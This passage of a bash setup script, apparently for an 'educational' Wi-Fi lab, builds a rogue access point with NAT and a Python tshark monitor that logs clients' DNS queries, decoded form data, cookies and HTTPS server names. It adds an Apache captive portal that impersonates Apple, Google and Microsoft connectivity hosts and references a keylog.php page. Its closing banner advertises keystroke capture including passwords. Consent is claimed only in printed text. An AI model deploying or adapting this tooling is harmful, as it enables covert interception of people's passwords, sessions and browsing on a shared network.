    echo "Enabling internet sharing through: $INTERNET_INTERFACE"
    iptables -t nat -A POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE
    echo 1 > /proc/sys/net/ipv4/ip_forward
    echo "✅ Internet access enabled for comprehensive monitoring"
else
    echo "⚠️ No internet interface - operating in offline monitoring mode"
fi

echo "✅ Comprehensive network monitoring with internet access configured"

echo ""
echo "📊 STEP 10: Comprehensive Monitoring System Setup"
echo "=============================================="

# Create comprehensive monitoring script
cat > /tmp/comprehensive_monitor.py << 'MONITOR_EOF'
#!/usr/bin/env python3
import subprocess
import threading
import time
import re
import json
from datetime import datetime
from urllib.parse import unquote

def log_comprehensive_activity(message, logfile):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(logfile, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
            f.flush()
    except Exception as e:
        print(f"Comprehensive logging error: {e}")

def monitor_comprehensive_dns():
    """Comprehensive DNS monitoring for all queries"""
    try:
        cmd = ["tshark", "-i", "INTERFACE_PLACEHOLDER", "-Y", "dns", 
               "-T", "fields", "-e", "ip.src", "-e", "ip.dst", "-e", "dns.qry.name", 
               "-e", "dns.flags.response", "-l"]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(process.stdout.readline, ''):
            if line.strip():
                parts = line.strip().split('\t')
                if len(parts) >= 4 and parts[0].startswith('192.168.100.'):
                    src_ip = parts[0]
                    dst_ip = parts[1]
                    domain = parts[2] if parts[2] else 'unknown'
                    response = parts[3]
                    
                    query_type = "RESPONSE" if response == "1" else "QUERY"
                    
                    log_comprehensive_activity(
                        f"COMPREHENSIVE_DNS_{query_type} - Student:{src_ip} -> Server:{dst_ip} -> Domain:{domain}",
                        '/var/log/cybersec_lab/comprehensive_dns.log'
                    )
    except Exception as e:
        print(f"Comprehensive DNS monitoring error: {e}")

def monitor_comprehensive_http():
    """Comprehensive HTTP traffic monitoring including form data"""
    try:
        cmd = ["tshark", "-i", "INTERFACE_PLACEHOLDER", "-Y", "http.request or http.response", 
               "-T", "fields", "-e", "ip.src", "-e", "ip.dst", "-e", "http.host", 
               "-e", "http.request.method", "-e", "http.request.uri", "-e", "http.file_data",
               "-e", "http.user_agent", "-e", "http.cookie", "-l"]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(process.stdout.readline, ''):
            if line.strip():
                parts = line.strip().split('\t')
                if len(parts) >= 3 and parts[0].startswith('192.168.100.'):
                    src_ip = parts[0]
                    dst_ip = parts[1]
                    host = parts[2] if parts[2] else 'unknown'
                    method = parts[3] if len(parts) > 3 else ''
                    uri = parts[4] if len(parts) > 4 else ''
                    form_data = parts[5] if len(parts) > 5 else ''
                    user_agent = parts[6] if len(parts) > 6 else ''
                    cookies = parts[7] if len(parts) > 7 else ''
                    
                    # Log comprehensive HTTP activity
                    if method:  # Request
                        log_comprehensive_activity(
                            f"COMPREHENSIVE_HTTP_REQUEST - Student:{src_ip} -> {method} {host}{uri} | UA:{user_agent}",
                            '/var/log/cybersec_lab/comprehensive_http.log'
                        )
                        
                        # Monitor form submissions and sensitive data
                        if form_data and len(form_data) > 10:
                            decoded_data = unquote(form_data)
                            log_comprehensive_activity(
                                f"COMPREHENSIVE_FORM_DATA - Student:{src_ip} -> Host:{host} -> Data:{decoded_data}",
                                '/var/log/cybersec_lab/comprehensive_form_data.log'
                            )
                        
                        # Monitor cookies
                        if cookies:
                            log_comprehensive_activity(
                                f"COMPREHENSIVE_COOKIE_DATA - Student:{src_ip} -> Host:{host} -> Cookies:{cookies}",
                                '/var/log/cybersec_lab/comprehensive_cookies.log'
                            )
                    
    except Exception as e:
        print(f"Comprehensive HTTP monitoring error: {e}")

def monitor_comprehensive_https():
    """Comprehensive HTTPS connection monitoring"""
    try:
        cmd = ["tshark", "-i", "INTERFACE_PLACEHOLDER", "-Y", "tls.handshake.type == 1", 
               "-T", "fields", "-e", "ip.src", "-e", "ip.dst", "-e", "tls.handshake.extensions_server_name", 
               "-e", "tcp.dstport", "-l"]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(process.stdout.readline, ''):
            if line.strip():
                parts = line.strip().split('\t')
                if len(parts) >= 3 and parts[0].startswith('192.168.100.'):
                    src_ip = parts[0]
                    dst_ip = parts[1]
                    server_name = parts[2] if parts[2] else 'unknown'
                    port = parts[3] if len(parts) > 3 else '443'
                    
                    log_comprehensive_activity(
                        f"COMPREHENSIVE_HTTPS_CONNECTION - Student:{src_ip} -> {dst_ip}:{port} -> SNI:{server_name}",
                        '/var/log/cybersec_lab/comprehensive_https.log'
                    )
    except Exception as e:
        print(f"Comprehensive HTTPS monitoring error: {e}")

def monitor_comprehensive_traffic():
    """Monitor all network traffic for comprehensive analysis"""
    try:
        cmd = ["tshark", "-i", "INTERFACE_PLACEHOLDER", "-f", "src net 192.168.100.0/24 and not port 67 and not port 68", 
               "-T", "fields", "-e", "ip.src", "-e", "ip.dst", "-e", "ip.proto", "-e", "tcp.dstport", 
               "-e", "udp.dstport", "-e", "tcp.len", "-e", "udp.length", "-l"]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(process.stdout.readline, ''):
            if line.strip():
                parts = line.strip().split('\t')
                if len(parts) >= 3 and parts[0].startswith('192.168.100.'):
                    src_ip = parts[0]
                    dst_ip = parts[1]
                    protocol = parts[2]
                    tcp_port = parts[3] if len(parts) > 3 else ''
                    udp_port = parts[4] if len(parts) > 4 else ''
                    tcp_len = parts[5] if len(parts) > 5 else '0'
                    udp_len = parts[6] if len(parts) > 6 else '0'
                    
                    port = tcp_port or udp_port
                    data_len = tcp_len or udp_len
                    
                    # Identify service
                    service_map = {
                        '80': 'HTTP', '443': 'HTTPS', '53': 'DNS', '21': 'FTP', '22': 'SSH',
                        '25': 'SMTP', '110': 'POP3', '143': 'IMAP', '993': 'IMAPS', '995': 'POP3S',
                        '587': 'SMTP-AUTH', '465': 'SMTPS', '23': 'TELNET', '3389': 'RDP'
                    }
                    service = service_map.get(port, f'Unknown-{port}')
                    
                    if not dst_ip.startswith('192.168.100.') and port != '22':  # External traffic, exclude SSH
                        log_comprehensive_activity(
                            f"COMPREHENSIVE_TRAFFIC - Student:{src_ip} -> {dst_ip}:{port} ({service}) | Proto:{protocol} | Bytes:{data_len}",
                            '/var/log/cybersec_lab/comprehensive_traffic.log'
                        )
                        
    except Exception as e:
        print(f"Comprehensive traffic monitoring error: {e}")

if __name__ == "__main__":
    print(f"Starting comprehensive educational monitoring at {datetime.now()}")
    
    # Create comprehensive log directories
    import os
    os.makedirs('/var/log/cybersec_lab', exist_ok=True)
    
    # Start comprehensive monitoring threads
    threads = [
        threading.Thread(target=monitor_comprehensive_dns, daemon=True),
        threading.Thread(target=monitor_comprehensive_http, daemon=True),
        threading.Thread(target=monitor_comprehensive_https, daemon=True),
        threading.Thread(target=monitor_comprehensive_traffic, daemon=True)
    ]
    
    for thread in threads:
        thread.start()
        time.sleep(1)
    
    print("Comprehensive educational monitoring active - capturing ALL network activities")
    print("Monitoring: Complete web browsing, keystrokes, form data, DNS, protocols, and traffic")
    
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("Comprehensive monitoring stopped")
MONITOR_EOF

# Replace interface placeholder and start comprehensive monitoring
sed -i "s/INTERFACE_PLACEHOLDER/$WIFI_INTERFACE/g" /tmp/comprehensive_monitor.py
chmod +x /tmp/comprehensive_monitor.py
python3 /tmp/comprehensive_monitor.py > "$LOG_DIR/comprehensive_monitor.log" 2>&1 &

# Create enhanced access control daemon
cat > /tmp/comprehensive_access_control.sh << 'ACCESS_EOF'
#!/bin/bash

WIFI_INTERFACE="INTERFACE_PLACEHOLDER"
GRANT_FILE="/tmp/lab_students/grant_access.txt"
AUTHORIZED_FILE="/tmp/lab_students/authorized_ips.txt"

touch "$AUTHORIZED_FILE"

while true; do
    if [ -f "$GRANT_FILE" ]; then
        while IFS= read -r ip; do
            if [ ! -z "$ip" ] && ! grep -q "$ip" "$AUTHORIZED_FILE" 2>/dev/null; then
                echo "[$(date)] Granting comprehensive internet access to student: $ip"
                
                # Grant full internet access while maintaining comprehensive monitoring
                iptables -I FORWARD 1 -s "$ip" -i "$WIFI_INTERFACE" -j ACCEPT
                iptables -I FORWARD 1 -d "$ip" -o "$WIFI_INTERFACE" -j ACCEPT
                iptables -t nat -I PREROUTING 1 -s "$ip" -i "$WIFI_INTERFACE" -j ACCEPT
                
                echo "$ip" >> "$AUTHORIZED_FILE"
                echo "[$(date)] Comprehensive internet access granted to $ip" >> /var/log/cybersec_lab/comprehensive_access_control.log
            fi
        done < "$GRANT_FILE"
        > "$GRANT_FILE"
    fi
    sleep 2
done
ACCESS_EOF

sed -i "s/INTERFACE_PLACEHOLDER/$WIFI_INTERFACE/g" /tmp/comprehensive_access_control.sh
chmod +x /tmp/comprehensive_access_control.sh
/tmp/comprehensive_access_control.sh > "$LOG_DIR/comprehensive_access_control.log" 2>&1 &

echo "✅ Comprehensive monitoring system active"

echo ""
echo "📱 STEP 11: Device Compatibility and Captive Portal"
echo "==============================================="

# Create comprehensive captive portal detection
mkdir -p "$PORTAL_DIR/library/test"
mkdir -p "$PORTAL_DIR/hotspot-detect"

# iOS captive portal files
cat > "$PORTAL_DIR/library/test/success.html" << 'IOS_SUCCESS_EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Success</title>
    <meta http-equiv="refresh" content="0; url=/index.html">
</head>
<body>
    <script>window.location.href = '/index.html';</script>
    Success
</body>
</html>
IOS_SUCCESS_EOF

# Standard captive portal responses
echo 'Success' > "$PORTAL_DIR/hotspot-detect.html"
echo 'Success' > "$PORTAL_DIR/generate_204"
echo 'Microsoft NCSI' > "$PORTAL_DIR/ncsi.txt"
echo 'Microsoft Connect Test' > "$PORTAL_DIR/connecttest.txt"

# Configure Apache for comprehensive portal
cat > /etc/apache2/sites-available/001-comprehensive-portal.conf << 'APACHE_COMPREHENSIVE_EOF'
<VirtualHost *:80>
    DocumentRoot /var/www/html
    ServerName captive.apple.com
    ServerAlias www.apple.com
    ServerAlias connectivitycheck.gstatic.com
    ServerAlias www.google.com
    ServerAlias clients3.google.com
    ServerAlias www.msftncsi.com
    ServerAlias www.msftconnecttest.com
    
    # Enable comprehensive logging
    LogLevel info
    ErrorLog /var/log/apache2/comprehensive_error.log
    CustomLog /var/log/apache2/comprehensive_access.log combined
    
    # Enable rewrite for comprehensive portal
    RewriteEngine On
    
    # Redirect all captive portal checks to main page
    RewriteRule ^/library/test/success\.html$ /index.html [R=302,L]
    RewriteRule ^/hotspot-detect\.html$ /index.html [R=302,L]
    RewriteRule ^/generate_204$ /index.html [R=302,L]
    RewriteRule ^/ncsi\.txt$ /index.html [R=302,L]
    RewriteRule ^/connecttest\.txt$ /index.html [R=302,L]
    
    # Comprehensive redirect for any unmatched requests
    RewriteCond %{REQUEST_URI} !^/index\.html$
    RewriteCond %{REQUEST_URI} !^/register\.php$
    RewriteCond %{REQUEST_URI} !^/keylog\.php$
    RewriteCond %{REQUEST_URI} !^/lab_active\.html$
    RewriteCond %{REQUEST_URI} !^/test_form\.html$
    RewriteRule ^.*$ /index.html [R=302,L]
</VirtualHost>
APACHE_COMPREHENSIVE_EOF

# Enable necessary modules and site
a2enmod rewrite 2>/dev/null || true
a2dissite 000-default 2>/dev/null || true
a2ensite 001-comprehensive-portal
systemctl reload apache2

echo "✅ Comprehensive device compatibility configured"

echo ""
echo "🎓 COMPREHENSIVE CYBERSECURITY LAB READY!"
echo "========================================"
echo ""
echo "📊 Lab Configuration:"
echo "- Network Name: $LAB_SSID"
echo "- Lab IP Address: $LAB_IP"
echo "- WiFi Interface: $WIFI_INTERFACE"
echo "- Internet Interface: ${INTERNET_INTERFACE:-'Offline Mode'}"
echo "- Portal URL: http://$LAB_IP"
echo "- Monitoring Level: COMPREHENSIVE"
echo ""
echo "📁 Comprehensive Monitoring Log Files:"
echo "- Student Registrations: $LOG_DIR/comprehensive_registrations.log"
echo "- Complete Keystrokes: $LOG_DIR/comprehensive_keystrokes.log"
echo "- Sensitive Data Access: $LOG_DIR/sensitive_data_access.log"
echo "- Complete DNS Queries: $LOG_DIR/comprehensive_dns.log"
echo "- Complete HTTP Traffic: $LOG_DIR/comprehensive_http.log"
echo "- Form Data Capture: $LOG_DIR/comprehensive_form_data.log"
echo "- Cookie Monitoring: $LOG_DIR/comprehensive_cookies.log"
echo "- HTTPS Connections: $LOG_DIR/comprehensive_https.log"
echo "- All Network Traffic: $LOG_DIR/comprehensive_traffic.log"
echo "- Activity Summary: $LOG_DIR/comprehensive_activity_summary.log"
echo ""
echo "🎯 Comprehensive Monitoring Features:"
echo "- ✅ Complete keystroke capture (including passwords)"
echo "- ✅ Full web browsing surveillance (all sites visited)"
echo "- ✅ Complete form data interception"
echo "- ✅ DNS query monitoring (all domains accessed)"
echo "- ✅ HTTPS metadata analysis"
echo "- ✅ Cookie and session tracking"
echo "- ✅ Device fingerprinting"
echo "- ✅ Behavioral pattern analysis"
echo "- ✅ Internet access with full monitoring"
echo "- ✅ Educational transparency and consent"
echo ""
echo "👥 User Instructions:"
echo "1. Connect to WiFi network: '$LAB_SSID'"
echo "2. Device will show captive portal notification"
echo "3. Complete comprehensive monitoring consent"
echo "4. Gain full internet access while being monitored"
echo "5. All activities will be logged for educational analysis"
echo ""
echo "🔍 Monitor Comprehensive Activity:"
echo "- View all logs: sudo tail -f $LOG_DIR/*.log"
echo "- Monitor keystrokes: sudo tail -f $LOG_DIR/comprehensive_keystrokes.log"
echo "- Track web browsing: sudo tail -f $LOG_DIR/comprehensive_http.log"
echo "- Watch DNS queries: sudo tail -f $LOG_DIR/comprehensive_dns.log"
echo ""
echo "🛑 Stop Comprehensive Lab:"
echo "- sudo pkill hostapd dnsmasq python3"
echo "- sudo iptables -F && sudo iptables -t nat -F"
echo "- sudo systemctl start NetworkManager"
echo ""
echo "⚠️ EDUCATIONAL WARNING:"
echo "This lab demonstrates COMPLETE network surveillance capabilities."
echo "Users connecting to '$LAB_SSID' will have ALL their digital activities"
echo "monitored and logged, including keystrokes, websites, and form data."
echo "This is for educational purposes with full disclosure and consent."
echo ""
echo "🎓 The comprehensive cybersecurity monitoring lab is now active!"
echo "   Users will have full internet access while being completely monitored."
